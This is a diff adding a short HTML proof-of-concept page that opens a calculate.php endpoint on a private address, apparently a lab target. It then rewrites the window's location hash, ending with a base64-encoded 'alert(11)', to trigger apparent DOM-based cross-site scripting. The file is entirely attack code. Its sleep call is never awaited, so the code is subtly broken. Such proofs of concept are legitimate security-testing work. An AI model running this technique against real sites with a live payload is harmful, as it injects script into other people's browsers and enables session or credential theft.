@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Modify Location Hash</title>
+  <script>
+
+    function sleep(ms) {
+    return new Promise((r) => setTimeout(r, ms));
+                    
+    }
+
+function modifyLocationHash() {
+      // Open the website
+      var url = "http://127.18.0.1///api/calculate.php";
+      var win = window.open(url);
+      sleep(5000);
+
+      // Modify the location.hash
+      var newHash = "http://127.18.0.1/api/calculate.php#mSsx";
+      win.location = newHash;
+
+      var newHash = "http://127.18.0.1/api/calculate.php#YWxlcnQoMTEp";
+      win.location = newHash;
+      
+    }
+  </script>
+</head>
+<body>
+  <h1>Modify Location Hash Example</h1>
+  <button onclick="modifyLocationHash()">Open and Modify</button>
+</body>
+</html>
